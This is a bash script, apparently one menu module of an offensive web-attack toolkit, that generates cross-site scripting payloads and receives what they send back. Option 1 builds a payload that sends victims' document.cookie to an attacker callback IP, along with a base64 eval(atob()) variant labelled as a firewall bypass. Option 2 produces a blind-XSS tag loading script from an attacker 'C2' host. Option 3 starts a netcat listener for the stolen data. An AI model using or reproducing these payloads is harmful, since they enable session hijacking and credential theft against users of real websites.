#!/usr/bin/env bash
source ./bxp_core.sh

trap_ctrl_c() { echo -e "\n${R}[!] Listener stopped by user.${N}"; sleep 1; }

while true; do
    bxp_ascii_title "NYCTOPHOBIA"
    
    echo -e "${C}  ==================================================${N}"
    echo -e "${C}  --------------------------------------------------${N}"
    echo ""
    echo -e "  \033[1;32m[1]\033[0m  \033[1;37mInitiate Basic Session Hook\033[0m"
    echo ""
    echo -e "  \033[1;32m[2]\033[0m  \033[1;37mDeploy Blind Session Vector\033[0m"
    echo ""
    echo -e "  \033[1;32m[3]\033[0m  \033[1;37mStart Data Exfiltration Listener\033[0m"
    echo ""
    echo -e "  \033[1;31m[4]\033[0m  \033[1;37mBack to Main Menu\033[0m"
    echo ""
    echo -e "${C}  --------------------------------------------------${N}"
    echo ""
    echo -ne "  ${Y}Select option > ${N}"
    read -r xss_choice

    case "$xss_choice" in
        1)
            echo ""
            echo -ne "  ${Y}Enter Target URL > ${N}"
            read -r target
            if [ -z "$target" ]; then echo -e "  ${R}[!] Error: Target URL empty.${N}"; sleep 1.5; continue; fi

            echo -ne "  ${Y}Enter Callback IP > ${N}"
            read -r callback_url
            if [ -z "$callback_url" ]; then echo -e "  ${R}[!] Error: Callback IP empty.${N}"; sleep 1.5; continue; fi
            
            echo ""
            echo -e "  ${G}[+] Initializing WAF Bypass...${N}"; sleep 1
            
            RAW_PAYLOAD="<script>new Image().src='http://${callback_url}:2010/?c='+document.cookie;</script>"
            B64_PAYLOAD=$(bxp_encode_b64 "$RAW_PAYLOAD")
            STEALTH_PAYLOAD="<script>eval(atob('${B64_PAYLOAD}'));</script>"
            
            echo ""
            echo -e "  ${W}Raw Vector:${N} $RAW_PAYLOAD"
            echo ""
            echo -e "  ${W}WAF Bypass Vector:${N} $STEALTH_PAYLOAD"
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        2)
            echo ""
            echo -ne "  ${Y}Enter C2 Receiver URL > ${N}"
            read -r c2_url
            if [ -z "$c2_url" ]; then echo -e "  ${R}[!] Error: C2 URL empty.${N}"; sleep 1.5; continue; fi

            echo ""
            echo -e "  ${G}[+] Deploying Blind Vector...${N}"; sleep 1
            
            PAYLOAD="<script src=\"http://${c2_url}:2010/blind.js\"></script>"
            echo ""
            echo -e "  ${W}Vector:${N} $PAYLOAD"
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        3)
            echo ""
            echo -e "  ${G}[+] Starting Listener on port 2010...${N}"
            echo -e "  ${Y}[!] Waiting for sessions... (CTRL+C to stop)${N}"
            trap trap_ctrl_c SIGINT
            if command -v nc >/dev/null 2>&1; then nc -lvnp 2010
            elif command -v ncat >/dev/null 2>&1; then ncat -lvnp 2010; fi
            trap - SIGINT
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        4) exit 0 ;;
        *) echo -e "  ${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
